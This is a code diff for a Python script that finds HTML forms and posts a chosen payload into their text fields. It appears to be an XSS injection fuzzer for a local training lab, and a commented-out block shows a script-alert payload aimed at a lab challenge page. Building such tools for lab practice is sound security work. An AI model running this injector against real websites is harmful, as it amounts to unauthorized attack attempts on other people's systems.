@@ -1,4 +1,4 @@
-import requests, bs4, urllib.parse,re
+import requests, bs4, urllib.parse,re, crawler
 
 def make_soup(url):
     r = requests.get(url)
@@ -11,26 +11,35 @@ def get_form(soup):
 
 def get_action(form, base_url):
     action = form['action']
-    # action is reletive url, convert it to absolute url
     abs_action = urllib.parse.urljoin(base_url, action)
     return abs_action
 
-def get_form_data(form, org_code):
+def get_form_data(form, payload):
     data = {}
     for inp in form('input'):
-        # if the value is None, we put the org_code to this field
-        if "name" in inp:
-            print("ok")
-            data[inp['name']] = "test"
-
+        if 'name' in inp.attrs: #do we change all hidden fields as well or only just text
+            if 'type' not in inp.attrs or inp['type'] == 'text':
+                data[inp['name']] = payload
+                
     return data
 
-if __name__ == '__main__':
-    url = 'http://facebook.com'
+def inject(url, payload, keyword, cookies):
     soup = make_soup(url)
     form = get_form(soup)
-    action = get_action(form, url)
-    data = get_form_data(form, '1634')
-    print(data)
-    # make request to the action using
-    r = requests.post(action, data=data)
+    if form != None:
+        action = get_action(form, url)
+        data = get_form_data(form, payload)
+        r = requests.post(action, data=data)
+    crawler.crawl(url, payload, keyword, cookies)
+##
+##if __name__ == '__main__':
+##    url = 'http://192.168.18.133/MCIR/xssmh/challenges/challenge2.php'
+##    payload = "<script>alert('freki')</script>"
+##    soup = make_soup(url)
+##    form = get_form(soup)
+##    action = get_action(form, url)
+##    data = get_form_data(form, payload)
+##    print(data)
+##    r = requests.post(action, data=data)
+##    # make request to the action using
+##    print(r)
